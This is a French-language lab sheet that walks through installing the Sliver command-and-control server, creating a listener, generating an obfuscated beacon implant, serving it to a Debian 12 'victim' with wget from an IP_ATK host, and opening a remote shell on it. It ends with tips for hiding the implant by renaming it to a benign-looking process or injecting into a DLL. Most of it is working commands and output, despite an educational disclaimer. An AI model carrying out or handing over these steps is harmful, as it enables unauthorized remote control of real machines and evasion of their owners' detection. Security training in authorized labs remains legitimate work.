
# **Clause de Responsabilité**

 Les informations présentées ci-dessous sont fournies **uniquement à des fins éducatives, de recherche ou de laboratoire**.  
 Toute expérimentation doit être réalisée **dans un environnement contrôlé**, avec les **autorisations nécessaires** et dans le respect des lois et réglementations en vigueur.  
 L’utilisation de ces connaissances en dehors d’un cadre légal ou autorisé est strictement interdite.  

# Objectif 

Le but de cette fiche est d'installer et configurer un serveur de commande et de contrôle ( C2 ). 
A la fin de cette une démonstration, il y a un test sur un hôte debian12, dans le but de pouvoir obtenir un shell distant persistant . 

# Setup C2 
#attak_poste

- Installation du programme d'installation "*sliver*" ( C2 )et lancement du programme d'installation

```bash 
soseche@DESKTOP-4H4MJDH:~/C2$ wget  https://sliver.sh/install # dl programe install
soseche@DESKTOP-4H4MJDH:~/C2$ chmod 777 install
soseche@DESKTOP-4H4MJDH:~/C2$ sudo ./install # lancement prgrm install
```

- Lancement de sliver 
```bash 
soseche@DESKTOP-4H4MJDH:~/C2$ sliver # Lancement du C2 
```

# Configuration C2
#victime_poste

- Une fois que vous avez un **accès sur la machine victime**, on doit savoir l'architecture de la machine :

```bash 
soseche@DESKTOP-4H4MJDH:~/C2$ uname -m # MAC ou Linux 

x86_64

PS C:\Users\Dell> echo $env:PROCESSOR_ARCHITECTURE # WIN 
AMD64

```










#attak_poste 
 - On va crée  un listener et commencé à utiliser sliver. ( Le port utilisé par le C2 est 31337 ).

```bash 
soseche@DESKTOP-4H4MJDH:~/C2$ sliver
Connecting to localhost:31337 ...

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain cipher
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

sliver > update

[*] Client v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405 - linux/amd64
    Compiled at 2025-02-19 20:57:36 +0100 CET
    Compiled with go version go1.20.7 linux/amd64


[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405 - linux/amd64
    Compiled at 2025-02-19 20:57:35 +0100 CET

Checking for updates ... done!

[*] No new releases.


sliver > http -l 8080

sliver > jobs # afficher les tâches en cours

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===============
 3    http   tcp        8080
 4    http   tcp        8181

sliver > jobs -k 4 # on kill la tache inutile, ajouter juste pour la démo

[*] Killing job #4 ...
[*] Successfully killed job #4

[!] Job #4 stopped (tcp/http)

[!] Job #4 stopped (tcp/http)

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===============
 3    http   tcp        8080

sliver >
```


> Un listener (ou écouteur) est un composant du serveur C2 qui reste en attente de connexions provenant des machines compromises. Il agit comme un point d’entrée : lorsque la victime exécute le beacon (ou un autre implant), celui-ci contacte le listener pour établir la communication. Une fois la connexion établie, le listener sert d’intermédiaire entre l’attaquant et la machine compromise, permettant l’envoi de commandes et la réception des résultats.

- On va crée le beacon maitenant 
#attak_poste 

```bash 
sliver > generate beacon -b IP_ATK:8080 #IP machine attaque WIN  
sliver > generate beacon -b IP_ATK:8080 --os linux -a x86 #IP machine attaque LINUX
sliver > generate beacon -b IP_ATK:8080 --os mac -a x86 #IP machine attaque  MAC
```
Il va se stocker le binaire crée sera obfusqué, et son nom sera INDIAN_CLAVE
```bash 
[*] Generating new linux/386 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 23s
[*] Implant saved to /home/soseche/C2/INDIAN_CLAVE
```

# Infection cible
Méthode la plus simple 
```bash 
# machine attaquante 
soseche@DESKTOP-4H4MJDH:~/C2$ ls
INDIAN_CLAVE  install
soseche@DESKTOP-4H4MJDH:~/C2$ python3 -m http.server # on lance un mini serveur web

# machine cible 
victime@DESKTOP-5H4MJDH:~$ wget http://IP_ATK:8000/INDIAN_CLAVE # téléchargement du beacon 
--2025-09-11 14:51:46--  http://IP_ATK:8000/INDIAN_CLAVE
Connecting to IP_ATK:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15126528 (14M) [application/octet-stream]
Saving to: ‘INDIAN_CLAVE’

INDIAN_CLAVE                           100%[============================================================================>]  14.43M  --.-KB/s    in 0.05s

2025-09-11 14:51:46 (292 MB/s) - ‘INDIAN_CLAVE’ saved [15126528/15126528]

victime@DESKTOP-5H4MJDH:~$ chmod 777 INDIAN_CLAVE
victime@DESKTOP-5H4MJDH:~$ ./INDIAN_CLAVE &
```

# Test de la backdoor
Maintenant on va avoir si la cible est bien connecté à notre C2 et on va préciser à sliver qu'on veut interagir avec la cible.

``` bash 
sliver > beacons

 ID         Name           Transport   Hostname          Username   Operating System   Last Check-In   Next Check-In
========== ============== =========== ================= ========== ================== =============== ===============
 f504769c   INDIAN_CLAVE   http(s)     DESKTOP-5H4MJDH   victime    linux/386          24s             1m2s
sliver > use
sliver (INDIAN_CLAVE) >
# on rend interfactif la session 
sliver (INDIAN_CLAVE) > interactive 
# on utilise la sessions interactive ( la dernière généralement )
sliver > use
# on lance un shell sur la machine ! 
sliver (INDIAN_CLAVE) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 681

victime@DESKTOP-5H4MJDH:~$ whoami
victime
victime@DESKTOP-5H4MJDH:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

```

Nous avons un shell persistant sur la machine !!


# Détection

Il est en réalité simple de ce faire détecter avec cette méthode. En effet si l'utilisateur *victime* regarde les process en cours il verra  *INDIAN_CLAVE* tournée en arrière plan. Il est alors possible de renommer ce fichier par un process qui semble bienveillant (Ex : pam.srvice) ou bien en s'injectant dans une DLL. D'autres méthodes plus discrètes peuvent être utilisé non mentionné dans ce document.  
